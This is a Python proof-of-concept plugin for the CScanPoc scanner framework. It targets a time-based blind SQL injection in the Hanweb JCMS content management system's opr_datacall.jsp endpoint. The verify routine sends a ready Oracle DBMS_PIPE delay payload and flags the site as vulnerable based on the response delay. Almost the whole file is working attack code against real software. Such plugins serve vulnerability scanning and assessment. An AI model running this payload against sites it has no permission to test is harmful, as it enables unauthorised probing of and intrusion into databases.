# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0014'  # 平台漏洞编号，留空
    name = '大汉JCMS /lm/front/api/opr_datacall.jsp sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-22'  # 漏洞公布时间
    desc = '''
        大汉科技（Hanweb) JCMS /lm/front/api/opr_datacall.jsp sql注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0148625'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '44d2ca15-91ba-4fa9-87d3-5eef830f66b0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148625
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + "/lm/front/api/opr_datacall.jsp?fn_billstatus=E&vc_id=1"
            payload = "%27%20AND%204683=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(104)||CHR(119)||CHR(98),5)%20AND%20%27OxYZ%27=%27OxYZ"
            url2 = url + payload
            time0 = time.time()
            code1, head, res, errcode, _ = hh.http(url)
            time1 = time.time()
            code2, head, res, errcode, _ = hh.http(url2)
            time2 = time.time()
            if code2 == 500 and code1 == 500 and ((time2 - time1) - (time1 - time0)) >= 4.5:
                #security_hole(url + '   found sql injection!')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
